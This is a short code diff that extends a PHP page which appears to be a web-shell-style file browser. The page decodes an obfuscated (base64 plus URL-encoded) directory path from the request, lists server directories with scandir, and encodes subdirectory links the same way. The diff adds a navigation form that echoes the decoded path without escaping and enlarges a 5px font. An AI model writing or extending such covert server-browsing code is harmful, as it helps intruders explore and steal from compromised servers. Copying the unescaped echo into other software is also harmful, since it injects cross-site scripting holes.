@@ -15,8 +15,6 @@ $gtdr = base64_decode($gtdr);
 $gtdr = urldecode($gtdr);
 $rdir = glink($gtdr);
 
-// ppppppppppppppppppppppppp
-
 function scnDir($dst) {
     $res = scandir($dst);
     return $res;
@@ -36,11 +34,13 @@ function scnDir($dst) {
         font-family: 'Courier New', Courier, monospace;
     }
     table td {
-        font-size: 5px;
+        font-size: 10px;
     }
 </style>
 <body>
-    <?php echo $gtdr; ?>
+    <form action="#" method="get">
+        <input type="text" name="gotodir" id="gotodir" value="<?php echo $gtdr; ?>">
+    </form>
     <table>
         <thead>
             <td>name</td>
@@ -53,7 +53,7 @@ function scnDir($dst) {
              <tr>
                 <td>
                     <?php
-                        $cekdir = $rdir.$vread.'/';
+                        $cekdir = $rdir.$vread;
                         $uricekdir = urlencode($cekdir);
                         $uricekdir = base64_encode($uricekdir);
                         if (is_dir($cekdir)) {
